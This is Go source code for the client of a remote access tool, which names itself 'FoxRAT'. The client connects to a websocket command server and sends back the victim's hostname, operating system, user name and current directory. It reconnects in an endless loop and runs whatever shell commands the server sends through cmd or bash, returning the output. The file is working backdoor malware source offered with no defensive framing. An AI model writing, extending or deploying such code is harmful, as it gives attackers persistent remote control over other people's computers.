package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

const (
	SERVER_HOST = "127.0.0.1"
	SERVER_PORT = 3000
	ACCOUNT     = "admin"
)

type Message struct {
	Type string `json:"type"`
	Cmd  string `json:"cmd,omitempty"`
	Seq  string `json:"seq,omitempty"`
}

func main() {
	hostname, _ := os.Hostname()
	pwd, _ := os.Getwd()

	dialer := websocket.Dialer{
		TLSClientConfig:   nil,
		HandshakeTimeout:  10 * time.Second,
		EnableCompression: true,
	}

	for {
		err := runSession(hostname, pwd, &dialer)
		if err != nil {
			time.Sleep(5 * time.Second)
		}
	}
}

func runSession(hostname, pwd string, dialer *websocket.Dialer) error {
	scheme := "wss"
	if SERVER_PORT == 80 {
		scheme = "ws"
	}
	url := fmt.Sprintf("%s://%s:%d", scheme, SERVER_HOST, SERVER_PORT)

	header := http.Header{}
	c, _, err := dialer.Dial(url, header)
	if err != nil {
		return err
	}
	defer c.Close()

	regMsg, _ := json.Marshal(map[string]interface{}{
		"type":    "register",
		"id":      hostname,
		"account": ACCOUNT,
		"info": map[string]interface{}{
			"hostname": hostname,
			"os":       runtime.GOOS,
			"arch":     runtime.GOARCH,
			"user":     os.Getenv("USERNAME"),
			"pwd":      pwd,
		},
	})
	c.WriteMessage(websocket.TextMessage, regMsg)

	for {
		_, raw, err := c.ReadMessage()
		if err != nil {
			return err
		}
		var msg Message
		if err := json.Unmarshal(raw, &msg); err != nil {
			continue
		}
		if msg.Type == "command" {
			go handleCommand(c, &msg)
		}
	}
}

func handleCommand(c *websocket.Conn, msg *Message) {
	cmd := msg.Cmd
	var output string

	parts := strings.SplitN(cmd, " ", 2)
	switch parts[0] {
	case "shell":
		script := ""
		if len(parts) > 1 {
			script = parts[1]
		}
		output = runScript(script)
	case "hostname":
		h, _ := os.Hostname()
		output = h
	case "whoami":
		output = runScript("whoami")
	case "msgbox":
		text := ""
		if len(parts) > 1 {
			text = parts[1]
		}
		if runtime.GOOS == "windows" {
			ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%s', 'FoxRAT')`, text)
			go exec.Command("powershell", "-command", ps).Start()
			output = "Message box shown"
		} else {
			output = "msgbox only on Windows"
		}
	case "cd":
		if len(parts) > 1 {
			if err := os.Chdir(parts[1]); err != nil {
				output = err.Error()
			} else {
				newPwd, _ := os.Getwd()
				output = "Changed to " + newPwd
			}
		}
	case "screenshot":
		output = "screenshot not supported in Go build"
	case "upload":
		output = "upload not supported in Go build"
	default:
		output = runScript(cmd)
	}

	result, _ := json.Marshal(map[string]interface{}{
		"type":   "cmd_result",
		"seq":    msg.Seq,
		"output": output,
	})
	c.WriteMessage(websocket.TextMessage, result)
}

func runScript(script string) string {
	if script == "" {
		pwd, _ := os.Getwd()
		return pwd
	}
	var out []byte
	var err error
	if runtime.GOOS == "windows" {
		out, err = exec.Command("cmd", "/c", script).CombinedOutput()
	} else {
		out, err = exec.Command("bash", "-c", script).CombinedOutput()
	}
	result := string(out)
	if err != nil {
		result += "\n" + err.Error()
	}
	return result
}
